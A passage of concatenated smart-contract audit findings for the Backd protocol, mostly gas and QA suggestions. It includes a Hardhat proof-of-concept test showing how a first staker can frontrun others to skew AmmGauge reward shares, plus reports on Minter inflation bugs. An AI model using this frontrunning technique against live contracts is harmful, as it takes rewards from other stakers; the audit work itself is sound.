oldPoolAddresses_.length; ) { ```  ### Recommendation It is recommended to cache the array length on a variable before running the loop, then it doesn't need to read the length on every iteration, which cost gas, for example : ``` uint256 len = pools.length; contracts/RewardHandler.sol:42:        for (uint256 i; i < len; i = i.uncheckedInc()) { ``` ---  ## Use != 0 instead of > 0 when comparing unsigned integers  != 0 will do the same as > 0 for unsigned integers, but != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled.  ### Instances include : ``` contracts/BkdLocker.sol:91:        require(amount > 0, Error.INVALID_AMOUNT); contracts/BkdLocker.sol:92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); contracts/BkdLocker.sol:137:        require(length > 0, "No entries"); contracts/tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, "No reward tokens in contract"); contracts/tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); ```  ### Recommendation It is recommended to replace `> 0` with `!= 0`, as they do the same thing for unsigned integers, and '!= 0' costs less gas compared to `> 0` in require statements with the optimizer enabled, also enable the optimizer.   For example : ``` contracts/BkdLocker.sol:91:        require(amount != 0, Error.INVALID_AMOUNT); ``` ---  ## If possible, use prefix increment instead of postfix increment  Prefix increment `++i` returns the updated value after it's incremented and postfix increment `i++` returns the original value then increments it. Prefix increment costs less gas compared to postfix increment.  ### Instances includes : ``` contracts/tokenomics/KeeperGauge.sol:59:        epoch++; contracts/tokenomics/KeeperGauge.sol:98:        epoch++; ```  ### Recommendation It is recommended to use prefix increment instead of postfix one when the return value is not needed, as both of them will give the same result and prefix increment costs less gas.   For example : ``` contracts/tokenomics/KeeperGauge.sol:59:        ++epoch; ``` ---
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L147 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L154   # Vulnerability details  ## Impact The first staker can take control of how the subsequent shares are going to be distributed by simply staking 1wei amount of the token and frontrunning future stakers. The reasons of this are related on how the variables are updated and with the amounts that the Gauge allows users to stake (anything but zero). The origin of this vulnerability relies on the evaluation of the `totalStaked` variable on its inception.  ## Proof of Concept To illustrate this attack an environment of testing was made in order to track the token flows and how the variables are being updated and read.  The initial or border conditions taken into account are the same as the used by the team to perform the tests and just a few assumptions and simplifications were taken.  1) The inflation rate is fixed for simplicity (`0.001`). This is valid within a short period of time because it is not a function of how the tokens are distributed or their flows. By tracking how the inflation rate is calculated an updated, we see that it is managed by the `currentInflationAmountAmm` within the [`Minter.sol` contract](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L184), which value is modified by `_executeInflationRateUpdate()` three lines below the last code permalink. Its value depends on non-token balance related parameters (such as inflation decays and annual rates). 2) For the testing environment performed by the team, a DummyERC20 was used as testing token. The same is done on the exploit environment. 3) The controller is not used because it is used to retrieve the inflation rate and it is now fixed because of 1).  Each user state is updated whenever he calls either `stake`, `unstake` or `claimRewards`.  Steps: - Alice is the first staker and deposits 1wei worth of DummyERC20. - Bob takes one day to find out this new protocol and decides to stake 10 ETH amount of tokens (`10 * 10**decimals()`). - Alice, who was scanning the mempool, frontruns Bob with the same amount he was willing to stake. Her txn is mined first. - Then Bobs' transaction is mined for the 10 ETH worth. - Sometime after this, the pool is checkpointed. - A few days pass, and Bob wants to stake even more tokens. The same amount as before. - Alice frontruns him again updating her shares. - Bobs' transaction is mined and his shares are also updated. - The pool is checkpointed again. And Alice managed to increase considerably her amount of shares.  Both cases were evaluated (with and without staking 1 wei first). The attack scenario outputs a 100% more shares to Alice than Bob in comparison with the ethical/non-attack situation.  The code used to perform this test is the following:      it("First Depositer Exploit", async function () {             let userShares = []             let userIntegral = []             let userBalance = []              let globalIntegral, totalStaked;             let aliceBob = [alice, bob];              // Starting Checkpoint             await this.ammgauge.poolCheckpoint();             await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 10 days                          const updateStates = async () => {                  userShares = []                 userIntegral = []                 userBalance = []                 for (const user of aliceBob) {                     let balances = ethers.utils.formatEther(await this.ammgauge.balances(user.address));                     let currentShare = ethers.utils.formatEther(await this.ammgauge.perUserShare(user.address));                     let currentStakedIntegral = ethers.utils.formatEther(await this.ammgauge.perUserStakedIntegral(user.address));                     userShares.push(currentShare);                     userIntegral.push(currentStakedIntegral);                     userBalance.push(balances);                 }                 globalIntegral = await this.ammgauge.ammStakedIntegral()                 totalStaked = await this.ammgauge.totalStaked()                 console.log("  ")                 console.log("         ALICE / BOB");                 console.log(`Shares: ${userShares}`);                 console.log(`Integr: ${userIntegral}`);                 console.log(`Balanc: ${userBalance}`);                 console.log("  ")                 console.log("Global")                 console.log(`Integral: ${ethers.utils.formatEther(globalIntegral)}, TotalStaked: ${ethers.utils.formatEther(totalStaked)}`)             }              const stake = async (to, amount) => {                 await updateStates()                 console.log(" ")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).stake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.add(amount));                 // await updateStates();                 console.log(" ")             }              const unstake = async (to, amount) => {                 await updateStates()                 console.log(" ")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).unstake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.sub(amount));                 await updateStates();                 console.log(" ")             }              // HERE IS WHERE THE SIMULATION IS PERFORMED             let simulationTimes = 2;             let withOneWeiDeposit = true;              if (withOneWeiDeposit) {                 // Alice deposits first                 console.log("Alice Deposits 1wei")                 let firstUserDeposit = ethers.utils.parseEther("1");                 await stake(alice, 1);             }              for (let index = 1; index <= simulationTimes; index++) {                 console.log(" ")                 console.log(`Loop number ${index}`);                 console.log(" ")                  console.log("A day passes until Bob decides to deposit")                 await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 1 days                  console.log(" ")                 console.log("She scans that Bob is about to stake 10. So decides to frontrun him.")                 console.log("Alice Frontruns")                 let frontrunAmount = ethers.utils.parseEther("10");                 await stake(alice, frontrunAmount);                  console.log(" ")                 console.log("Bob stakes 10 tokens")                 await stake(bob, frontrunAmount)                  // A few days pass                 await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 2 days                 // The pool is checkpointed                 await this.ammgauge.poolCheckpoint();                 console.log("After 1 day the pool is checkpointed")                 await updateStates()              }         })  The simulation was both made for the attacked and non attacked situations. The values that are shown represent how the contract updates them (the `totalStaked` variable is 0 when first Alice calls the stake function after `_userCheckpoint()` rans)  ### WITH 1WEI STAKE (ATTACK)   | time |                Situation               |  totalStaked  | Alice Shares | Bob Shares | |:----:|:--------------------------------------:|:-------------:|:------------:|:----------:| |  0-  |          First poolCheckpoint          |       0       |       0      |      0     | |  0+  |           Alice Deposits 1wei          |       0       |       0      |      0     | |   1  |       Alice frontruns Bob @ 10eth      |      1wei     |       0      |      0     | |   2  |         Bob 10eth txn is mined         |  10eth + 1wei |     86.4     |      0     | |   3  | 1 day later poolCheckpoint() is called | 20eth + 1 wei |     86.4     |      0     | |   4  |        Alice frontruns Bob again       | 20eth + 1 wei |     86.4     |      0     | |   5  |         Bob 10eth txn is mined         |  30eth + 1wei |     172.8    |      0     | |   6  | 1 day later poolCheckpoint() is called |  40eth + 1wei |     172.8    |    86.4    |  ### WITHOUT THE 1WEI STAKE (No "first staker hijack")  | time |                Situation               | totalStaked | Alice Shares | Bob Shares | |:----:|:--------------------------------------:|:-----------:|:------------:|:----------:| |  0-  |          First poolCheckpoint          |      0      |       0      |      0     | |  0+  |           Alice stakes 10eth           |      0      |       0      |      0     | |   1  |            Bob stakes 10eth            |    10eth    |       0      |      0     | |   2  | 1 day later poolCheckpoint() is called |    20eth    |       0      |      0     | |   3  |           Alice stakes 10eth           |    20eth    |       0      |      0     | |   4  |            Bob stakes 10eth            |    30eth    |     86.4     |      0     | |   5  | 1 day later poolCheckpoint() is called |    40eth    |     86.4     |    86.4    |   ## Recommended Mitigation Steps Further evaluation on how the variables are updated and how does the `Integral` (both each users and global one) is calculated on the pool inception is needed to patch this issue.  
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L104-L108   # Vulnerability details  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L104-L108  ```solidity     function startInflation() external override onlyGovernance {         require(lastEvent == 0, "Inflation has already started.");         lastEvent = block.timestamp;         lastInflationDecay = block.timestamp;     } ```  As `lastEvent` and `lastInflationDecay` are not initialized in the `constructor()`, they will remain to the default value of `0`.  However, the permissionless `executeInflationRateUpdate()` method does not check the value of `lastEvent` and `lastInflationDecay` and used them directly.  As a result, if `executeInflationRateUpdate()` is called before `startInflation()`:  1. L190, the check of if `_INFLATION_DECAY_PERIOD` has passed since `lastInflationDecay` will be `true`, and `initialPeriodEnded` will be set to `true` right away; 2. L188, since the `lastEvent` in `totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));` is `0`, the `totalAvailableToNow` will be set to `totalAvailableToNow ≈ currentTotalInflation * 52 years`, which renders the constrains of `totalAvailableToNow` incorrect and useless.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L115-L117  ```solidity     function executeInflationRateUpdate() external override returns (bool) {         return _executeInflationRateUpdate();     } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215  ```solidity     function _executeInflationRateUpdate() internal returns (bool) {         totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));         lastEvent = block.timestamp;         if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {             currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);             if (initialPeriodEnded) {                 currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(                     annualInflationDecayKeeper                 );                 currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(                     annualInflationDecayAmm                 );             } else {                 currentInflationAmountKeeper =                     initialAnnualInflationRateKeeper /                     _INFLATION_DECAY_PERIOD;                  currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;                 initialPeriodEnded = true;             }             currentTotalInflation =                 currentInflationAmountLp +                 currentInflationAmountKeeper +                 currentInflationAmountAmm;             controller.inflationManager().checkpointAllGauges();             lastInflationDecay = block.timestamp;         }         return true;     } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L50-L51  ```solidity     // Used for final safety check to ensure inflation is not exceeded     uint256 public totalAvailableToNow; ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L217-L227  ```solidity     function _mint(address beneficiary, uint256 amount) internal returns (bool) {         totalAvailableToNow += ((block.timestamp - lastEvent) * currentTotalInflation);         uint256 newTotalMintedToNow = totalMintedToNow + amount;         require(newTotalMintedToNow <= totalAvailableToNow, "Mintable amount exceeded");         totalMintedToNow = newTotalMintedToNow;         lastEvent = block.timestamp;         token.mint(beneficiary, amount);         _executeInflationRateUpdate();         emit TokensMinted(beneficiary, amount);         return true;     } ```  ### Recommendation   Consider initializing `lastEvent`, `lastInflationDecay` in `constructor()`.  or  Consider adding `require(lastEvent != 0 && lastInflationDecay != 0, "...")` to `executeInflationRateUpdate()`.  
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215   # Vulnerability details  When `Minter.sol#_executeInflationRateUpdate()` is called, if an `_INFLATION_DECAY_PERIOD` has past since `lastInflationDecay`, it will update the InflationRate for all of the gauges.  However, in the current implementation, the rates will be updated first, followed by the rewards being settled using the new rates on the gauges using `inflationManager().checkpointAllGauges()`.  If the `_INFLATION_DECAY_PERIOD` has passed for a long time before `Minter.sol#executeInflationRateUpdate()` is called, the users may lose a significant amount of rewards.  On a side note, `totalAvailableToNow` is updated correctly.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215  ```solidity function _executeInflationRateUpdate() internal returns (bool) {     totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));     lastEvent = block.timestamp;     if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {         currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);         if (initialPeriodEnded) {             currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(                 annualInflationDecayKeeper             );             currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(                 annualInflationDecayAmm             );         } else {             currentInflationAmountKeeper =                 initialAnnualInflationRateKeeper /                 _INFLATION_DECAY_PERIOD;              currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;             initialPeriodEnded = true;         }         currentTotalInflation =             currentInflationAmountLp +             currentInflationAmountKeeper +             currentInflationAmountAmm;         controller.inflationManager().checkpointAllGauges();         lastInflationDecay = block.timestamp;     }     return true; } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L110-L125  ```solidity function checkpointAllGauges() external override returns (bool) {     uint256 length = _keeperGauges.length();     for (uint256 i; i < length; i = i.uncheckedInc()) {         IKeeperGauge(_keeperGauges.valueAt(i)).poolCheckpoint();     }     address[] memory stakerVaults = addressProvider.allStakerVaults();     for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) {         IStakerVault(stakerVaults[i]).poolCheckpoint();     }      length = _ammGauges.length();     for (uint256 i; i < length; i = i.uncheckedInc()) {         IAmmGauge(_ammGauges.valueAt(i)).poolCheckpoint();     }     return true; } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L110-L117  ```solidity function poolCheckpoint() public override returns (bool) {     if (killed) return false;     uint256 timeElapsed = block.timestamp - uint256(lastUpdated);     uint256 currentRate = IController(controller).inflationManager().getKeeperRateForPool(pool);     perPeriodTotalInflation[epoch] += currentRate * timeElapsed;     lastUpdated = uint48(block.timestamp);     return true; } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L507-L519  ```solidity function getKeeperRateForPool(address pool) external view override returns (uint256) {     if (minter == address(0)) {         return 0;     }     uint256 keeperInflationRate = Minter(minter).getKeeperInflationRate();     // After deactivation of weight based dist, KeeperGauge handles the splitting     if (weightBasedKeeperDistributionDeactivated) return keeperInflationRate;     if (totalKeeperPoolWeight == 0) return 0;     bytes32 key = _getKeeperGaugeKey(pool);     uint256 poolInflationRate = (currentUInts256[key] * keeperInflationRate) /         totalKeeperPoolWeight;     return poolInflationRate; } ```   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L173-L176  ```solidity     function getKeeperInflationRate() external view override returns (uint256) {         if (lastEvent == 0) return 0;         return currentInflationAmountKeeper;     } ```  ### PoC  Given:  - currentInflationAmountAmm: 12,000 Bkd (1000 per month) - annualInflationDecayAmm: 50% - initialPeriodEnded: true - lastInflationDecay: 11 months ago - _INFLATION_DECAY_PERIOD: 1 year  1. Alice deposited as the one and only staker in the `AmmGauge` pool; 2. 1 month later; 3. `Minter.sol#_executeInflationRateUpdate()` is called; 4. Alice `claimableRewards()` and received `500` Bkd tokens.  Expected Results:  - Alice to receive `1000` Bkd tokens as rewards.  Actual Results:  - Alice received `500` Bkd tokens as rewards.  ### Recommendation  Consider moving the call to `checkpointAllGauges()` to before the `currentInflationAmountKeeper` is updated.  ```solidity function _executeInflationRateUpdate() internal returns (bool) {     totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));     lastEvent = block.timestamp;     if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {         controller.inflationManager().checkpointAllGauges();         currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);         if (initialPeriodEnded) {             currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(                 annualInflationDecayKeeper             );             currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(                 annualInflationDecayAmm             );         } else {             currentInflationAmountKeeper =                 initialAnnualInflationRateKeeper /                 _INFLATION_DECAY_PERIOD;              currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;             initialPeriodEnded = true;         }         currentTotalInflation =             currentInflationAmountLp +             currentInflationAmountKeeper +             currentInflationAmountAmm;         lastInflationDecay = block.timestamp;     }     return true; } ```  
# QA  ## Use unchecked lib  ### `PoolMigrationZap.sol`  #### Enforce pattern on loops You can add the unchecked math lib like you do on the others contracts to safely increment the `i` var, saving gas and make contract consistent with the others by enforcing the same style.  On [`PoolMigrationZap.sol#L39-L44`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L39-L44) you are doing a unchecked increment in the loop, but in the rest of the code you a different pattern. Add the unchecked math lib and change: ```solidity         for (uint256 i; i < oldPoolAddresses_.length; ) {             migrate(oldPoolAddresses_[i]);             unchecked {                 ++i;             }         } ``` To; ```solidity         for (uint256 i; i < oldPoolAddresses_.length; i = i.uncheckedInc()) {             migrate(oldPoolAddresses_[i]);         } ```  #### `_underlyingNewPools` can end with a wrong data  If `underlying_` is `address(0)` then `_underlyingNewPools[address(0)]` will be fill...  Consider change lines [`PoolMigrationZap.sol#L26-L27`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L26-L27) from: ```solidity             _underlyingNewPools[underlying_] = newPool_;             if (underlying_ == address(0)) continue; ``` To: ```solidity             if (underlying_ == address(0)) continue;             _underlyingNewPools[underlying_] = newPool_; ```  ## `ConvexStrategyBase.sol`  ### Change var name to avoid shadow  On line [L287](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/strategies/ConvexStrategyBase.sol#L287) you are declaring variable with the same name, i understang that is for caching, but i recommend to change the variable name, consider changing this; ```solidity         address _swapperRouter = address(_swapperRouter);         IERC20(token_).safeApprove(_swapperRouter, 0);         IERC20(token_).safeApprove(_swapperRouter, type(uint256).max); ``` To this; ```solidity         address swapperRouter_ = address(_swapperRouter);         IERC20(token_).safeApprove(swapperRouter_, 0);         IERC20(token_).safeApprove(swapperRouter_, type(uint256).max); ```  ## `LiquidityPool.sol`  ### Add check before calling `safeApprove`  In think you will need a check before doing the safeApprove call on [LiquidityPool.sol#L700](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/pool/LiquidityPool.sol#L700) Just replace; ```solidity  IERC20(lpToken_).safeApprove(staker_, type(uint256).max); ``` With  ```solidity if (IERC20(lpToken_).allowance(staker_, spender) > 0) return; IERC20(lpToken_).safeApprove(staker_, type(uint256).max); ```  _keeperGauge  ## Missing event emission  Critical function dont emit events; [`InflationManager.sol#L58-L63:setMinter`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L58-L63) [InflationManager.sol#L89:deactivateWeightBasedKeeperDistribution](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L89)  
# Gas optimizations   ## Use unchecked lib to increment safe variables  ### `PoolMigrationZap.sol`  You can add the unchecked math lib like you do on the others contracts to safely increment the `i` var, saving gas and make contract consistent with the others by enforcing the same style.  Recommendation, add `using UncheckedMath for uint256` And on line [`PoolMigrationZap.sol#L22`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L22) change; ```solidity for (uint256 i; i < newPools_.length; ++i) { ``` To ```solidity for (uint256 i; i < newPools_.length; i = i.uncheckedInc()) { ```  ### `TopUpKeeperHelper.sol`  On line [TopUpKeeperHelper.sol#L52](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/actions/topup/TopUpKeeperHelper.sol#L52) you coul use unchecked math lib to increment the variable. Change: ```solidity topupsAdded++; ``` To: ```solidity topupsAdded = topupsAdded.uncheckedInc(); ```  ### `KeeperGauge.sol`  On lines [#L98](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L98) and [L59](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L59) you could use unchecked math lib, consider change;  ```solidity epoch++; ``` To; ```solidity epoch = epoch.uncheckedInc(); ```  ### Use unchecked for decrement `i` On [BkdLocker.sol#L140](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L140) you can do a unchecked decrement (or add a function to the Unchecked math to do it) change; ```solidity i = i - 1; ``` to; ```solidity unchecked { --i; } ```  ### Cache `.length`  You could cache lenght of arrays to save gas; [`RewardHandler.sol#L41-L42`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L41-L42) [`StakerVault.sol#L259`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L259) [`VestedEscrow.sol#L94`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L94)   ### Use `require(foo != 0)` instead of `require(foo > 0)`  `>0` is less gas efficient than `!0` if you enable the optimizer at 10k AND you’re in a require statement.  [`BkdLocker.sol#L91`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L91) [`BkdLocker.sol#L92`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L92) [`BkdLocker.sol#L137`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L137) [`VestedEscrow.sol#L84`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L84) [`KeeperGauge.sol#L140`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L140) [`AmmGauge.sol#L104`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L104) [`AmmGauge.sol#L125`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L125) 
 ## > 0 is less efficient than != 0 for unsigned integers (with proof)  `!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)  Proof: While it may seem that `> 0` is cheaper than `!=`,  this is only true without the optimizer enabled and outside a require  statement. If you enable the optimizer at 10k AND you’re in a `require` statement, this will save gas. You can see this tweet for more proofs: [https://twitter.com/gzeon/status/1485428085885640706](https://twitter.com/gzeon/status/1485428085885640706)  I suggest changing `> 0` with `!= 0` here:  ### Instances: contracts/BkdLocker.sol:91:        require(amount > 0, Error.INVALID_AMOUNT); contracts/BkdLocker.sol:92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); contracts/BkdLocker.sol:137:        require(length > 0, "No entries"); contracts/pool/LiquidityPool.sol:469:        require(underlyingAmount > 0, Error.INVALID_AMOUNT); contracts/pool/LiquidityPool.sol:471:        require(lpToken_.balanceOf(account) > 0, Error.INSUFFICIENT_BALANCE); contracts/pool/LiquidityPool.sol:514:        require(mintedLp >= minTokenAmount && mintedLp > 0, Error.INVALID_AMOUNT); contracts/pool/LiquidityPool.sol:538:        require(redeemLpTokens > 0, Error.INVALID_AMOUNT); contracts/testing/MockVotingEscrow.sol:35:        require(_balances[msg.sender] > 0, "a lock needs to first be created"); contracts/testing/MockErc20Strategy.sol:64:        require(currentBalance > 0, "Invalid amount to withdraw"); contracts/testing/MockErc20Strategy.sol:74:        require(amount > 0, "Invalid amount to transfer"); contracts/testing/MockEthStrategy.sol:65:        require(currentBalance > 0, "Invalid amount to withdraw"); contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, "No reward tokens in contract"); contracts/tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); contracts/tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); contracts/vault/Vault.sol:163:        require(amount > 0, Error.INVALID_AMOUNT); contracts/actions/topup/TopUpActionFeeHandler.sol:123:        require(totalClaimable > 0, Error.NOTHING_TO_CLAIM); contracts/actions/topup/TopUpAction.sol:214:        require(record.singleTopUpAmount > 0, Error.INVALID_AMOUNT); contracts/actions/topup/TopUpAction.sol:535:        require(position.totalTopUpAmount > 0, Error.INSUFFICIENT_BALANCE);  Also, please enable the Optimizer.
1. Don't change storage variable needlessly contracts\BkdLocker.sol#L144 Currently it replaces stashedWithdraws[i] even if "i" equals to "stashedWithdraws.length - 1". And it calculates stashedWithdraws.length every time after pop right, you can reduce gas by changing the length variable. You can replace L144 like below.  --length; if(i != length) {     stashedWithdraws[i] = stashedWithdraws[length]; }   2. Needless conditions. contracts\tokenomics\InflationManager.sol#L575 contracts\tokenomics\InflationManager.sol#L589 contracts\tokenomics\InflationManager.sol#L602  From the logic of the contract, "totalKeeperPoolWeight" will be always non-negative. Even if this value could be negative, it will be revoked with underflow error before.   3. Use != 0 instead of > 0 for uint variables contracts\BkdLocker.sol#L91 contracts\BkdLocker.sol#L92 contracts\BkdLocker.sol#L137 contracts\BkdLocker.sol#L139 contracts\BkdLocker.sol#L254 contracts\BkdLocker.sol#L301 contracts\tokenomics\AmmGauge.sol#L88 contracts\tokenomics\AmmGauge.sol#L104 contracts\tokenomics\AmmGauge.sol#L125 contracts\tokenomics\AmmGauge.sol#L147 contracts\tokenomics\FeeBurner.sol#L117 contracts\tokenomics\KeeperGauge.sol#L140 contracts\tokenomics\LpGauge.sol#L68 contracts\tokenomics\LpGauge.sol#L114 contracts\tokenomics\VestedEscrow.sol#L84 contracts\RewardHandler.sol#L63  4. Change storage to memory if possible contracts\BkdLocker.sol#L251   5. An array’s length should be cached to save gas in for-loops contracts\StakerVault.sol#L259 contracts\tokenomics\FeeBurner.sol#L56 contracts\tokenomics\InflationManager.sol#L116 contracts\tokenomics\VestedEscrow.sol#L94 contracts\zaps\PoolMigrationZap.sol#L22 contracts\zaps\PoolMigrationZap.sol#L39   6. Usage of unchecked can reduce the gas cost contracts\StakerVault.sol#L387  _allowances[src][msg.sender] = allowance_.uncheckedSub(unstaked);
## Summary It was easy to understand the logic for me because the codes have detailed explanations. I recommended adding some more require() for better performance.  ## Low Risk Issues 1. Add additional require() for better performance.  i) contracts\BkdLocker.sol#L49 require(_govToken != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); require(_rewardToken != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  ii) contracts\BkdLocker.sol#L60 "maxBoost" must be greater than "startBoost", otherwise L276-L278 will be revoked. require(maxBoost >= startBoost, Error.INVALID_AMOUNT);  iii) contracts\BkdLocker.sol#L60 "increasePeriod" must be positive, otherwise L276-L278 will be revoked. require(increasePeriod != 0, Error.INVALID_AMOUNT);  iv) contracts\BkdLocker.sol#L123 "amount" must be positive, otherwise the user can prepare unlock endlessly. require(amount != 0, Error.INVALID_AMOUNT);  v) contracts\BkdLocker.sol#L215 require(claimable != 0, Error.INVALID_AMOUNT);  vi) contracts\tokenomics\VestedEscrow.sol#L60 In this setFundAdmin() function at L75, it checks the first require() already. require(fundadmin_ != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); require(rewardToken_ != address(0), , Error.ZERO_ADDRESS_NOT_ALLOWED);   2. Wrong comment contracts\BkdLocker.sol#L87  There are no "deposit" or "depositFor" functions in this contract. You need to write "lock" or "lockFor" instead. 